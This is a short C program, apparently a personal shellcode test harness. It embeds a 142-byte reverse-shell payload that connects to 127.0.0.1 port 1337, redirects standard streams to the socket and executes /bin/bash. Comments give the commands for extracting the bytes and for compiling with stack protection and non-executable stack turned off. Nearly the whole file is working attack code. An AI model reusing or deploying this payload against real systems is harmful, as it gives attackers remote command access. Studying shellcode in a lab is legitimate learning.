// get shell with:
//
// objdump -d asmtests/reverseshell | grep '[0-9a-f]:' | cut -f2 -d: | cut -f1-7 -d ' ' | head -n -3 | paste -d '' -s | sed 's/\t/ /g' | tr -s ' ' | sed 's/\ /\\x/g'
//
// compile with:
//
// gcc -fno-stack-protector -z execstack -o testshell testshell.c
//
int main(){
    const char shellcode[142] = "\xbb\x02\x00\x00\x00\xb9\x01\x00\x00\x00\xba\x06"
    "\x00\x00\x00\xb8\x67\x01\x00\x00\xcd\x80\x49\x89\xc5\xb8\x00\x00\x00\x00\x50"
    "\x48\xb8\x02\x00\x05\x39\x7f\x00\x00\x01\x50\xb8\x2a\x00\x00\x00\x4c\x89\xef"
    "\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9"
    "\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9\x01\x00\x00\x00"
    "\xcd\x80\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9\x02\x00\x00\x00\xcd\x80\xb8\x68"
    "\x00\x00\x00\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50\xb8\x3b\x00\x00"
    "\x00\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05";

    int (*ret)() = (int(*)())shellcode; ret();

    return 0;
}